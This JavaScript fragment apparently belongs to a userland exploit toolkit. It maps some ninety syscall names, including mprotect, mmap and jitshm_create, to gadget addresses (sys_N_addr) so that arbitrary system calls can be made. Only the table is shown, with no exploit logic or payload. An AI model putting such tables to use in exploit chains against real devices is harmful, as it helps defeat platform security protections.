export var get_gpo_addr = sys_623_addr;
export var dynlib_get_list_for_libdbg_addr = sys_672_addr;
export var uuidgen_addr = sys_392_addr;
export var mprotect_addr = sys_74_addr;
export var sched_setparam_addr = sys_327_addr;
export var chmod_addr = sys_15_addr;
export var munlockall_addr = sys_325_addr;
export var kqueueex_addr = sys_141_addr;
export var ioctl_addr = sys_54_addr;
export var virtual_query_all_addr = sys_674_addr;
export var thr_create_addr = sys_430_addr;
export var setregid_addr = sys_127_addr;
export var shm_unlink_addr = sys_483_addr;
export var sendto_addr = sys_133_addr;
export var _umtx_lock_addr = sys_434_addr;
export var fcntl_addr = sys_92_addr;
export var mlockall_addr = sys_324_addr;
export var rename_addr = sys_128_addr;
export var _umtx_op_addr = sys_454_addr;
export var sigsuspend_addr = sys_341_addr;
export var madvise_addr = sys_75_addr;
export var namedobj_delete_addr = sys_558_addr;
export var swapcontext_addr = sys_423_addr;
export var utc_to_localtime_addr = sys_638_addr;
export var mmap_addr = sys_477_addr;
export var eport_close_addr = sys_584_addr;
export var osem_delete_addr = sys_550_addr;
export var listen_addr = sys_106_addr;
export var socketpair_addr = sys_135_addr;
export var get_sdk_compiled_version_addr = sys_647_addr;
export var thr_wake_addr = sys_443_addr;
export var rtprio_thread_addr = sys_466_addr;
export var evf_wait_addr = sys_542_addr;
// export var _umtx_op_addr = sys_454_addr;
export var sigwait_addr = sys_429_addr;
export var sendfile_addr = sys_393_addr;
export var fdatasync_addr = sys_658_addr;
export var ksem_init_addr = sys_404_addr;
export var netabort_addr = sys_101_addr;
export var setpriority_addr = sys_96_addr;
export var getsockopt_addr = sys_118_addr;
export var set_uevt_addr = sys_640_addr;
export var close_addr = sys_6_addr;
export var mdbg_service_addr = sys_601_addr;
export var blockpool_open_addr = sys_653_addr;
export var truncate_addr = sys_479_addr;
export var opmc_get_hw_addr = sys_626_addr;
export var namedobj_create_addr = sys_557_addr;
export var get_kernel_mem_statistics_addr = sys_646_addr;
export var jitshm_create_addr = sys_533_addr;
export var ksem_close_addr = sys_400_addr;
export var dl_get_list_addr = sys_535_addr;
export var thr_get_name_addr = sys_616_addr;
export var thr_set_name_addr = sys_464_addr;
export var select_addr = sys_93_addr;
export var thr_resume_ucontext_addr = sys_633_addr;
export var aio_multi_delete_addr = sys_662_addr;
export var msync_addr = sys_65_addr;
export var sigaltstack_addr = sys_53_addr;
export var set_gpo_addr = sys_617_addr;
export var dup2_addr = sys_90_addr;
export var clock_settime_addr = sys_233_addr;
export var ksem_trywait_addr = sys_403_addr;
export var ipmimgr_call_addr = sys_622_addr;
export var get_bio_usage_all_addr = sys_667_addr;
export var opmc_set_hw_addr = sys_625_addr;
export var kqueue_addr = sys_362_addr;
export var opmc_get_ctr_addr = sys_567_addr;
export var getsockname_addr = sys_32_addr;
export var get_self_auth_info_addr = sys_607_addr;
export var aio_get_data_addr = sys_665_addr;
export var query_memory_protection_addr = sys_547_addr;
export var rfork_addr = sys_251_addr;
// export var sys_exit_addr = sys_1_addr;
export var sigtimedwait_addr = sys_345_addr;
export var getpriority_addr = sys_100_addr;
export var process_terminate_addr = sys_652_addr;
export var getdtablesize_addr = sys_89_addr;
export var is_development_mode_addr = sys_606_addr;
export var jitshm_alias_addr = sys_534_addr;
export var getuid_addr = sys_24_addr;
export var pwrite_addr = sys_476_addr;
export var ftruncate_addr = sys_480_addr;
export var sigpending_addr = sys_343_addr;
export var physhm_unlink_addr = sys_630_addr;
export var getitimer_addr = sys_86_addr;
export var read_addr = sys_3_addr;
export var stat_addr = sys_188_addr;
export var pwritev_addr = sys_290_addr;
